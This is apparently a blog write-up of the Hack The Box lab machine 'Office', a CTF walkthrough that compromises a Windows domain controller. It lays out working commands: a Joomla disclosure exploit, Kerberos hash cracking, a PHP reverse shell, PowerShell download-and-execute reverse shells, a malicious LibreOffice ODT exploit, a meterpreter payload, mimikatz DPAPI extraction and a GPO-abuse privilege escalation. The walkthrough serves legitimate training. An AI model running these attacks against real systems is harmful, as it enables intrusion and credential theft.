---
title:  "HTB Office Writeup"
date:   2024-06-22 00:30:00 
categories: HTB Machine
tags: CVE-2023-2255 CVE-2023-23752 GPO_abuse DPAPI AD
---

![Office](/assets/img/Office/GGYTVglW4AAhki3.png)

## Introduction 

This box was up untill this point one of my personal favourites. The road to initial access required a healthy mix of web app vulnerabilities as well as common active directory enumeration techniques.

Lateral movement was quite fun on this machine as well especially since it made use of different types of lateral movement again a mix of exploiting publicly known vulnerabilities as well as common active directory attack paths.

System was personally quite fun i've never encountered this in the wild so it was fun to finally get a chance to abuse GPO's to gain privileges

If you like any of my content it would help a lot if you used my referral link to buy Hack The Box/Academy Subscriptions which you can find on my about page.

## Initial access
### Recon

To start off our recon we will begin with an Nmap scan of the machine. Using the following command:
```
sudo nmap -sS -A  -p-  -o nmap  10.129.166.30
```
**Nmap**
```
# Nmap 7.94 scan initiated Tue Feb 20 12:30:24 2024 as: nmap -sS -A -p- -o nmap 10.129.105.41
Nmap scan report for 10.129.105.41
Host is up (0.030s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
| http-robots.txt: 16 disallowed entries (15 shown)
| /joomla/administrator/ /administrator/ /api/ /bin/ 
| /cache/ /cli/ /components/ /includes/ /installation/ 
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
|_http-generator: Joomla! - Open Source Content Management
|_http-title: Home
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-21 01:32:48Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
|_ssl-date: TLS randomness does not represent time
443/tcp   open  ssl/http      Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-title: 403 Forbidden
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
54739/tcp open  msrpc         Microsoft Windows RPC
59804/tcp open  msrpc         Microsoft Windows RPC
59819/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (89%)
Aggressive OS guesses: Microsoft Windows Server 2022 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h59m57s
| smb2-time: 
|   date: 2024-02-21T01:33:42
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   31.07 ms 10.10.14.1
2   31.90 ms 10.129.105.41

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb 20 12:34:25 2024 -- 1 IP address (1 host up) scanned in 240.89 seconds

```

When reviewing the Nmap output we can see that the machine is a domain controller with a webserver. All the standard ports of a domain controller are present here such as port 88 for kerberos, port 445 for SMB and port 389 for ldap. My first guess would be to try and access these protocols without any authentication. This did not give us any valuable information as null sessions were not allowed on this domain controller. My next check was to check the webserver.


### Webserver

When connecting to the webserver we were greeted with the following front page.

![Office](/assets/img/Office/Office_01.png)

When looking closer at the page that was returned in the html source we could clearly see that joomla was being used. in the response below we can see that the http-generator is joomla.

```
HTTP/1.1 200 OK
Date: Wed, 21 Feb 2024 02:17:58 GMT
Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
X-Powered-By: PHP/8.0.28
x-frame-options: SAMEORIGIN
referrer-policy: strict-origin-when-cross-origin
cross-origin-opener-policy: same-origin
Expires: Wed, 17 Aug 2005 00:00:00 GMT
Last-Modified: Wed, 21 Feb 2024 02:17:58 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 24214



<!DOCTYPE html>
<html lang="en-gb" dir="ltr">
<head>
    <meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="generator" content="Joomla! - Open Source Content Management">
	<title>Home</title>
```

Seeing its using joomla its always a good idea to run joomscan then. if joomscan isn't already installed you can easily install it  using apt-get

```bash
sudo apt-get install joomscan
```

Then you can  scan the host using the following command. Here we could see that the Joomla version used was **4.2.7**

```bash
joomscan -u http://office.htb
```

![Results joomscan](/assets/img/Office/Office_02.png)


Version 4.2.1 is vulnerable to an unauthenticated information disclosure vulnerability known under [Joomla! information disclosure - CVE-2023-23752 exploit](https://github.com/Acceis/exploit-CVE-2023-23752). To use this exploit we need to first download it using git and install its dependencies

```bash
git clone https://github.com/Acceis/exploit-CVE-2023-23752
bundle install
```

Next we can run the exploit with the following parameter. This will give us some interesting information like 

```bash
ruby exploit.rb http://office.htb
```

![Password obtained](/assets/img/Office/Office_03.png)

So now we have access to the root password of the MYSQL service. We weren't able to login to Joomla with these credentials though so we'll need to figure out another way to use this password.

```
H0lOgrams4reTakIng0Ver754!
```

### User enumeration

So we found a password but don't know what account this belongs to yet. Seeing null sessions are not allowed on the  machine i decided to try and guess some usernames using kerbrute and a large wordlist. I ran kerbrute with the biggest username list present within seclists like this:

```bash
./kerbrute_linux_amd64 userenum  -d office.htb --dc 10.129.105.41 /home/kali/share/Share/Tools/general/SecLists/Usernames/xato-net-10-million-usernames.txt --threads 200
```

After letting this run for a while we could find the following usernames to be valid

![Usernames found](/assets/img/Office/Office_04.png)

Now that we have a list of usernames i created the following list of usernames. I removed the domain because most tools add the domain either with an extra parameter or add it implicitly.

```
administrator
Administrator
etower
ewhite
dwolfe
dlanor
dmichael
hhogan
DWOLFE
DLANOR
tstark
dlanoR
EWHITE
Dwolfe
Dlanor
```

Next up i'll try this password we found on all the users we were able to enumerate using kerbrute. I'll use netexec for this with the --shares parameter so we can see if any of these accounts have access to shares.

```bash
netexec smb 10.129.105.41 -u ./users.txt  -p 'H0lOgrams4reTakIng0Ver754!'--shares
```

![Share access](/assets/img/Office/Office_05.png)

### SMB access 


Now that we have access to the SMB share we can download all files we have access too using netexec. We have to make sure we set the **DOWNLOAD_FLAG=True MAX_FILE_SIZE=1000000000000** flags otherwise it won't download all possible files

```bash
netexec smb 10.129.105.41 -u 'dwolfe'  -p 'H0lOgrams4reTakIng0Ver754!' -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=1000000000000
```
![Files downloaded](/assets/img/Office/Office_06.png)

When we check the file contents of the downloaded files of the SOC Analysis share we can see an interesting pcap file.

```bash
ls /tmp/nxc_spider_plus/10.129.105.41/SOC\ Analysis
```
![Pcap file obtained](/assets/img/Office/Office_07.png)

### Pcap analysis

So now that we have the pcap file we load it into wireshark with the following command. After running the command we'll see contents of the file.

```bash
wireshark Latest-System-Dump-8fbc124d.pcap
```
![Pcap opened](/assets/img/Office/Office_08.png)

While doing analysis on the pcap file i could see that there were a few kerberos packets in this pcap file as well. This is interesting because we could use this to get access the hash of the kerberos ticket. All the pieces of a kerberos ticket that we can crack using hashcat is present within this one packet.

![Kerberos](/assets/img/Office/Office_09.png)

A kerberos ticket is made up from the following parts:

- Kerberos header
- Encryption type
- client name
- realm
- cipher

We can deduce all of those from the previous screenshot but i'll go over them in detail one by one. The first part of our ticket we can determine by the fact that everyone there is padata mentioned this is only used for pre-authenication packets. So our hash would now have the following format so far

![kerberos type](/assets/img/Office/Office_10.png)

```
$krb5pa$
```

Next up let us try and find the encryption type. We can see this on the line with Etype. lets add this number to our hash

![Etype](/assets/img/Office/Office_11.png)

```
$krb5pa$18$
```

Next up lets add the cname. this part is included in the req-body part of the packet

![Cname](/assets/img/Office/Office_12.png)

```
$krb5pa$18$tstark$
```

Next lets add the realm to our kerberos ticket, The realm can be found in the same req-body part of the message.

![Realm](/assets/img/Office/Office_13.png)

```
$krb5pa$18$tstark$OFFICE.HTB$
```

Then the last part is the cipher message. This can be found in thea as-req part of the message

```
$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
```

![Cipher](/assets/img/Office/Office_14.png)

So now that we have the full hash we can try to crack it using hashcat. Using the following command i was able to crack the kerberos ticket's password. After a few moments we could see that the passoword of **tstark** was **playboy69**

```bash
hashcat -m 19900 -O -a 0 -w 4 kerbhash /usr/share/wordlists/rockyou.txt 
```
![cracked password](/assets/img/Office/Office_15.png)


We can verify that this password is valid with netexec

```bash
netexec smb 10.129.105.41 -u 'tstark'  -p 'playboy69' 
```
![Tstark working](/assets/img/Office/Office_16.png)

### Active directory enumeration

Now that we have a valid account i decided to run bloodhound to take an extract of all the domain controller objects. I ran bloodhound with the following settings:

```bash
bloodhound-python -d office.htb -v --zip -c All -dc 10.129.105.175 -ns 10.129.105.175 -u tstark -p  playboy69
```
When looking through the bloodhound output we can see one path that looks very interesting. It seems to be that the group GPO MANAGERS has a generic write on the default domain policy. This means that users that have access to this group could compromise the entire domain

![Path to domain admin](/assets/img/Office/Office_21.png)

When checking what users are present in the group we can see that there is only one user named **HHOGAN**. This means that our main target to compromise is the HHOGAN account.

![HHOGAN](/assets/img/Office/Office_22.png)


### Remote code execution

When i tried to login with the tstark account using winrm this didn't work. However earlier we saw that tony stark was the only user in the joomla users database using the information disclosure. So i used the **playboy69** password with the **Administrator** account

![Logged in joomla](/assets/img/Office/Office_17.png)

A classic way to get code execution using joomla is to modify one of the templates so you can replace the PHP code with a php reverse shell. In this case i used [this reverse shell](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php) only thing i modified was the ip address and port in the bottom. I chose to modify the index file from the first template i could fine 

```
http://office.htb/administrator/index.php?option=com_templates&view=template&id=223&file=Ly9pbmRleC5waHA%3D&isMedia=0
```

![Modifying template](/assets/img/Office/Office_18.png)

After saving this template please browse to the following template page to trigger the reverse shell. Then after a few moments we'd get a reverse shell as 

```
http://office.htb/templates/cassiopeia/index.php
```

![Reverse shell](/assets/img/Office/Office_19.png)


## Lateral movement

### Moving to tstark user
So our first lateral movement would be to get a reverse shell as the **tstark** user. I hosted a copy of  **Invoke-PowerShellTcp.ps1** script of [nishang](https://github.com/samratashok/nishang) This github repo contains multiple powershell scripts including reverse shells and other post exploitation tools. next i setup a webserver in the shells directory of the github project using python.


```
python -m http.server 80
```
Next up we'll need the tool [RunasCS](https://github.com/antonioCoco/RunasCs) to help us run our reverse shell from a non interactive shell.

On the client we need to first download the RunasCS binary 

```powershell
curl "http://10.10.16.67/RunasCs.exe" -o RunasCs.exe
```

Next up we can run a command as webservice using the following command, reverse shell we'll re-use the same one we used before but this time with a different port

```powershell
.\RunasCs.exe tstark playboy69 "powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.16.67/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.67 -Port 444" 
```

![Lateral movement to tstark](/assets/img/Office/Office_20.png)



### Moving to ppots user

While enumerating the system i could see that there are actually multiple sites being used of which one was internal only website.This website did not have a lot of source code only two files. We will look deeper into the **resume.php** file

![Internal website](/assets/img/Office/Office_23.png)

![Internal folders](/assets/img/Office/Office_24.png)

For brevity of the writeup i removed all the HTML that didn't do show us any real functionality. In this script we can see that it basically is a web page that allows the user to upload their resume as a **docm docx doc or  odt** file which will then be moved to the location **applications/**. This script makes me believe that there might be someone opening resume's whenever they get added into the applications directory. Seeing the name of the box is Office it made it sound more plausible to me.

```php
<?php
$notifi = "";
if($_SERVER["REQUEST_METHOD"] == "POST" ){
  $stdname=trim($_POST['fullname']);
  $email=str_replace('.','-',$_POST['email']);
  $experience=trim($_POST['experience']);
  $salary=trim($_POST['salary']);
  $department=trim($_POST['department']);
  $rewritefn = strtolower(str_replace(' ','-',"$stdname-$department-$salary $experience $email"));
  
  $filename =$_FILES['assignment']['name'];
  $filetype= $_FILES['assignment']['type'];
  $filesize =$_FILES['assignment']['size'];
  $fileerr = $_FILES['assignment']['error'];
  $filetmp = $_FILES['assignment']['tmp_name'];
  chmod($_FILES['assignment']['tmp_name'], 0664);
  // onigiri in .
 $ext = explode('.',$filename);
  //last piece of data from array
 $extension = strtolower(end($ext));
  $filesallowed = array('docm','docx','doc','odt');
   if(in_array($extension,$filesallowed)){
     if ($fileerr === 0){
       if ($filesize < 5242880){
	 $ff = "$rewritefn.$extension";
	 $loc = "applications/".$ff;
	   if(move_uploaded_file($filetmp,$loc))
	   {
	     // upload successful
	     $notifi="<span class=notifi>??? Upload Successful!</span><hr/><style>
	       button, input , select, option, h3{
			display:none;
		}
	       </style>";
	 } else {
echo $loc;
	 $notifi="<span class=notifi>??????  Something Went Wrong! Unable To upload the Resume!</span><hr/>";
	 }
       
       } else {
	 
	 $notifi="<span class=notifi>??????  Your Resume should be less than 5MB!</span><hr/>";
       }
     
     } else {
   $notifi="<span class=notifi>??????  Corrupted File/Unable to Upload!</span><hr/>";
     }
   
   } else {
   $notifi="<span class=notifi>??? Accepted File Types : Doc, Docx, Docm, Odt!</span><hr/>";
   }
}

<snipped>
```

Next i did further enumeration on the system to check what document client they might be using. Here i found out that they were using libreoffice 5 because it was installed in the **c:\Program Files** 

![Internal folders](/assets/img/Office/Office_25.png)

When looking for vulnerabilities related to this version of libreoffice i stumbled upon the following [CVE](https://nvd.nist.gov/vuln/detail/CVE-2023-2255) which seems perfect. Basically there is an error that when you open a specifically crafted odt file with this version it allows an attacker to execute code on the machine itself. There is a publicly known exploit that can be downloaded from [github](https://github.com/elweth-sec/CVE-2023-2255?tab=readme-ov-file).

First download the exploit using git 

```bash
git clone https://github.com/elweth-sec/CVE-2023-2255.git
```

Next run the exploit like so. To test if the exploit actually works i started with a simple curl command. If this command shows up in our webserver we have proof that the code execution actually works and we can upgrade it to a full on reverse shell.

```bash
python3 CVE-2023-2255.py --cmd 'curl http://10.10.16.67/EXPLOIT-WORKED' --output 'resume.odt'
```

Next download our resume into the applications folder of the internal application.

```powershell
curl "http://10.10.16.67/resume.odt" -o C:\xampp\htdocs\internal\applications\resume.odt
```

After a few moments we'd get a callback to our http server this means that the code execution exploit works

![office exploit](/assets/img/Office/Office_26.png)

So now that we know that it worked we need to weaponize this with a reverse shell. To make it easier on myself i'm going to create a meterpreter reverse shell using msfvenom

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.16.67 LPORT=4000 -f exe > calico.exe
```

after creating our payload we start our listener like so.

```bash
msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter_reverse_tcp;set LHOST tun0;set LPORT 4000;run;"
```

Now that we have our payload we need to download it to a location every user can access. The public user directory is perfect for this as its a user that by default anyone can access 

```powershell
curl "http://10.10.16.67/calico.exe" -o c:\users\public\calico.exe
```

next we create our new resume file but this time instead of doing a curl command, we make it execute our reverse shell.

```bash
python3 CVE-2023-2255.py --cmd 'c:\users\public\calico.exe' --output 'resume.odt'
```
Then we download our resume again like we did before 

```bash
curl "http://10.10.16.67/resume.odt" -o C:\xampp\htdocs\internal\applications\resume.odt
```

A few moments later we'll get a reverse shell as the ppots user.

![Shell as ppots](/assets/img/Office/Office_27.png)



### Moving to hhogan user

While enumerating using the newly obtained **ppots** user we noticed this user had access to some credentials hidden within dpapi.To find these we first need to transfer mimikatz to the machine. if you don't already have mimikatz you can get it from the [github](https://github.com/ParrotSec/mimikatz) repo.

```
curl "http://10.10.16.67/mimikatz.exe" -o mimikatz.exe
```

Next we can list all credentials with the vault::list command

```
.\mimikatz.exe "vault::list"
```
![Vaults found](/assets/img/Office/Office_28.png)




I'll go over how to obtain these credentials step by step. First of all we need to obtain the guidMasterKey. to find this key we need to find the id's of all the directories within **C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\\**

```powershell
dir /a:h C:\Users\PPotts\AppData\Roaming\Microsoft\credentials
```
![Credential id's](/assets/img/Office/Office_29.png)

So now we know here are 3 different credential blobs namely:

- 18A1927A997A794B65E9849883AC3F3E
- 84F1CAEEBF466550F4967858F9353FB4
- E76CCA3670CD9BB98DF79E0A8D176F1E

So next up we need to found all the potential masterkeys. To do this we first need to find the SID

```powershell
get-childitem C:\Users\PPotts\appdata\roaming\microsoft\protect\
```

![SID](/assets/img/Office/Office_30.png)

Now that we know the SID we can check what masterkey objects are present within this SID's directory. here we can see there are two objects namely **10811601-0fa9-43c2-97e5-9bef8471fc7d** and **191d3f9d-7959-4b4d-a520-a444853c47eb**

```powershell
get-childitem -hidden C:\Users\PPotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107
```
![MAsterkey locations](/assets/img/Office/Office_31.png)

At this moment i don't know which one was the right one yet so you should extract the masterkey from both of them


```powershell
.\mimikatz.exe "dpapi::masterkey /in:C:\Users\PPotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\10811601-0fa9-43c2-97e5-9bef8471fc7d /rpc" "exit"
.\mimikatz.exe "dpapi::masterkey /in:C:\Users\PPotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc" "exit"
```
![Masterkey obtained](/assets/img/Office/Office_32.png)

Now that we have the masterkey we can start trying to decrypt the previously found credential blobs. This key will only work on one specific blob. At this moment i didn't know it yet but for the write up i'll just include the correct one.

```powershell
.\mimikatz.exe "dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166" "exit"
```

![Credentials obtained](/assets/img/Office/Office_33.png)


```bash
netexec smb 10.129.105.41 -u 'HHogan'  -p 'H4ppyFtW183#' 
```

![Workign credentials](/assets/img/Office/Office_34.png)


## Privilege escalation

So now we have access to hhogan's credentials we should open up a reverse shell as this user. We will do this by using the same runasCS command as earlier. A moment later we will be greeted with the reverse shell.

```
.\RunasCs.exe hhogan H4ppyFtW183# "powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.16.67/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.67 -Port 445" 
```
![Shell as hhogan](/assets/img/Office/Office_35.png)

So earlier in bloodhound we saw that this user is able to abuse GPO objects. Now first we need to find a GPO that we can exploit properly that has permission to launch commands on the domain controller. We can list all gpo's present within the domain by using the following cypher query in bloodhound. From this list the only gpo that is able to send commands to the domain controller is **DEFAULT DOMAIN CONTROLLERS POLICY@OFFICE.HTB** This makes it an excellent target.

```bash
Match (n:GPO) return n
```

![Domain controller policy](/assets/img/Office/Office_36.png)

Next step is to get the SharpGPOAbuse binary on the machine. if you don't have it already you can download a precompiled version [here](https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0). Then we download this binary to our machine the same way as we did before.

```powershell
curl "http://10.10.16.67/SharpGPOAbuse.exe" -o SharpGPOAbuse.exe
```
next we run our exploit with the following parameters. With this we'll make the domain controller start a new shell as system using our previous meterpreter binary

```powershell
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "New Task" --Author OFFICE\Administrator --Command "cmd.exe" --Arguments "/c c:\users\public\calico.exe" --GPOName "Default Domain Controllers Policy"
```

![Exploit worked](/assets/img/Office/Office_37.png)

Now that we updated the group policy we are able to instantly trigger it by forcing a group policy update. After doing this we'd get a reverse shell in our meterperter listener as system.

```powershell
gpupdate /force
```

![Shell as system](/assets/img/Office/Office_38.png)
